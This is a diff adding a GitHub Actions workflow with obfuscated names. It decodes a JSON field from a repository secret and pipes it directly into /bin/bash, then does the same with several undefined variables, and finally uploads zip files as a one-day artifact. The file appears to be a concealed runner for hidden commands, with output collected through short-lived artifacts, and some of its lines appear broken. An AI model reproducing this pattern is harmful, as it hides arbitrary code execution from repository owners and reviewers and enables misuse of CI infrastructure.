@@ -1,0 +1,25 @@
+name: beaubridge702
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: beaubridge702
+        env:
+          me5: ${{ secrets.me5 }}
+        run: |
+          printf '%s' "$me5" | jq -r .cwvz5 | /bin/bash
+          echo $jzkj25 | jq -r .ltm9771 | /bin/bash
+          printf '%s' "$zlc39" | jq -r .a49 | /bin/bash
+          echo $fdfa684 | jq -r .xo10 | /bin/bash
+          printf '%s' "$b30539" | jq -r .qpxoj000 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: eY2O3XVc
+          path: "*.zip"
+          retention-days: 1
